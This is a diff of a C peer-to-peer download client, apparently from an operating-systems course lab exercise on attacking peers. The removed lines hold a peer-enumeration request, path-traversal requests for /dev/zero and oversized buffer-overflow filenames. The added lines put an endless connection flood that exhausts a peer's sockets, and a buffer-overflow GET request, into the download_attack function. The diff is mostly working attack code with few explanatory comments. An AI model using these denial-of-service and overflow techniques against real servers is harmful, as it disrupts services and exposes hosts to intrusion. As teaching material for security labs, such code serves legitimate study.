@@ -472,21 +472,13 @@ task_t *start_download(task_t *tracker_task, const char *filename)
 	assert(tracker_task->type == TASK_TRACKER);
 	
 	message("* Finding peers for '%s'\n", filename);
-	
-	// make filename null b/c we're going to grab all peers so specific file unnecessary
-	if (evil_mode)
-		filename = "";
 		
-	// attack connected peers
-	if (evil_mode)
-		osp2p_writef(tracker_task->peer_fd, "WHO %s\n", filename);
-	else
-		osp2p_writef(tracker_task->peer_fd, "WANT %s\n", filename);
+	osp2p_writef(tracker_task->peer_fd, "WANT %s\n", filename);
 	
 	messagepos = read_tracker_response(tracker_task);
 	if (tracker_task->buf[messagepos] != '2') {
 		error("* Tracker error message while requesting '%s':\n%s",
-		      (evil_mode ? "all peers as victims" : filename), &tracker_task->buf[messagepos]);
+		      filename, &tracker_task->buf[messagepos]);
 		goto exit;
 	}
 
@@ -511,13 +503,13 @@ task_t *start_download(task_t *tracker_task, const char *filename)
 	s1 = tracker_task->buf;
 	while ((s2 = memchr(s1, '\n', (tracker_task->buf + messagepos) - s1))) {
 		if (!(p = parse_peer(s1, s2 - s1)))
-			die("osptracker responded to %s command with unexpected format!\n", (evil_mode ? "WHO" : "WANT"));
+			die("osptracker responded to WANT command with unexpected format!\n");
 		p->next = t->peer_list;
 		t->peer_list = p;
 		s1 = s2 + 1;
 	}
 	if (s1 != tracker_task->buf + messagepos)
-		die("osptracker's response to %s has unexpected format!\n", (evil_mode ? "WHO" : "WANT"));
+		die("osptracker's response to WANT has unexpected format!\n");
 
  exit:
 	return t;
@@ -552,28 +544,7 @@ static void task_download(task_t *t, task_t *tracker_task)
 		   && t->peer_list->port == listen_port)
 		goto try_again;
 	
-	// Exercise 3 - Try a peer overrun attack
-	if (evil_mode == 2) {
-		message("* Try attacking %s:%d with '%s' peer denial of service\n", 
-			inet_ntoa(t->peer_list->addr), 
-			t->peer_list->port, t->filename);
-		// try once
-		t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
-		if (t->peer_fd == -1) {
-			error("* Error: can't connect to peer: %s\n", strerror(errno));
-			goto try_again;
-		}
-		// attack repeatedly
-		while (1) {
-			t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
-			if (t->peer_fd == -1) {
-				error("* Successful peer overrun - user can no longer connect to peer any more: %s\n"
-					, strerror(errno));
-				goto try_again;
-			}
-		}
-	}
-	//End 3 Code
+	
 	
 	// Connect to the peer and write the GET command
 	message("* Connecting to %s:%d to download '%s'\n",
@@ -584,21 +555,6 @@ static void task_download(task_t *t, task_t *tracker_task)
 		error("* Cannot connect to peer: %s\n", strerror(errno));
 		goto try_again;
 	}
-	
-	// Exercise 3 - Attempt buffer overflow
-	if (evil_mode == 1) {
-		message("* Try attacking with filename buffer overflow\n");
-		// create buffer overflow input
-		char overflow[FILENAMESIZ * 3];
-		memset(overflow, 1, FILENAMESIZ*3);
-
-		// send input
-		osp2p_writef(t->peer_fd, "GET %s OSP2P\n", overflow);
-
-		// attempt with other peers
-		// goto try_again;
-	}
-	//End 3 Code
 	
 	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
 
@@ -824,6 +780,7 @@ void download_attack(task_t *tracker_task)
 		return;
 	}
 
+	
 	while (t->peer_list != NULL)
 	{
 		pid_t pid;
@@ -844,62 +801,38 @@ void download_attack(task_t *tracker_task)
 			task_pop_peer(t);
 			continue;
 		}
-
-		message("* Attack %s:%d\n", inet_ntoa(t->peer_list->addr), t->peer_list->port);
-		srand(time(NULL));
-
-		while (num_attacks < MAX_NUM_ATTACK_ATTEMPTS)
-		{
+		
+		// Try a peer overrun attack
+		message("* Try attacking %s:%d with '%s' peer denial of service\n", 
+		inet_ntoa(t->peer_list->addr), 
+		t->peer_list->port, t->filename);
+		// try once
+		t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
+		if (t->peer_fd == -1) {
+			error("* Error: can't connect to peer: %s\n", strerror(errno));
+			//goto try_again;
+		}
+		// attack repeatedly
+		while (1) {
 			t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
-
-			if (t->peer_fd == -1)
-			{
-				message("* Can't open a socket to %s, %d\n", inet_ntoa(t->peer_list->addr), t->peer_list->port);
-				task_free(t);
-				exit(1);
+			if (t->peer_fd == -1) {
+				error("* Successful peer overrun - user can no longer connect to peer any more: %s\n"
+					, strerror(errno));
+				//goto try_again;
 			}
-			// randomly select and connect a peer and a path and run GET
-			switch(rand() % 4)
-			{
-				case 0:
-					// /////////dev/zero will be read as an absolute path
-					osp2p_writef(t->peer_fd, "GET %s OSP2P\n", "/////////dev/zero");
-					break;
-				case 1:
-					// provide path to /dev/zero
-					osp2p_writef(t->peer_fd, "GET %s OSP2P\n", "../../../../../../../../dev/zero");
-					break;
-				case 2:
-				{
-					// make a large path to cause buffer overflow
-					// 1025 > 1024 for *2 boundary for larger buffer size
-					const size_t size = 1025;
-					char evil_buffer[size + 1];
-					memset(evil_buffer, 'a', size);
-					evil_buffer[size] = '\0';
-
-					osp2p_writef(t->peer_fd, "GET %s OSP2P\n", evil_buffer);
-					break;
-				}
-				case 3:
-				default:
-				{
-					// Make large path for buffer overflow filled with null byte
-					const size_t size = 1025;
-					char evil_buffer[size + 1];
-					memset(evil_buffer, '\0', size);
-
-					osp2p_writef(t->peer_fd, "GET ");
-					write(t->peer_fd, evil_buffer, size);
-					osp2p_writef(t->peer_fd, " OSP2P\n");
-					break;
-				}
-			}
-
-			close(t->peer_fd);
-			num_attacks++;
 		}
 
+		// Attempt a buffer overflow
+		message("* Try attacking with filename buffer overflow\n");
+		// create buffer overflow input
+		char overflow[FILENAMESIZ * 3];
+		memset(overflow, 1, FILENAMESIZ*3);
+
+		// send input
+		osp2p_writef(t->peer_fd, "GET %s OSP2P\n", overflow);	
+
+		close(t->peer_fd);
+			
 		message("* Tried attacking %s:%d\n", inet_ntoa(t->peer_list->addr), t->peer_list->port);
 		exit(0);
 	}
